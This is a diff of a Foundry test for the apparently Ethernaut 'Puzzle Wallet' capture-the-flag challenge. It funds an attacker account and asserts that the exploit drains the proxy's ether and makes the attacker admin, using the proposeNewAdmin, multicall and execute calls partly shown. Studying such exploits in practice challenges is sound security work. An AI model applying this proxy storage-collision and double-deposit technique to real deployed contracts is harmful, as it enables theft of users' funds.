@@ -22,6 +22,7 @@ contract PuzzleWalletTest is Test {
 
     function test_PuzzleWalletExploitVulnerability() public {
         vm.startPrank(attacker);
+        deal(attacker, 0.001 ether);
 
         puzzleProxy.proposeNewAdmin(attacker);
 
@@ -49,11 +50,6 @@ contract PuzzleWalletTest is Test {
 
         address(puzzleProxy).call{value: 0.001 ether}(multicall);
 
-        console.log(
-            "PuzzleProxy balance after multicall: ",
-            address(puzzleProxy).balance
-        );
-
         bytes memory execute = abi.encodeWithSelector(
             puzzleWallet.execute.selector,
             attacker,
@@ -73,5 +69,7 @@ contract PuzzleWalletTest is Test {
         vm.stopPrank();
 
         assertEq(puzzleProxy.admin(), attacker);
+        assertEq(attacker.balance, 0.002 ether);
+        assertEq(address(puzzleProxy).balance, 0);
     }
 }
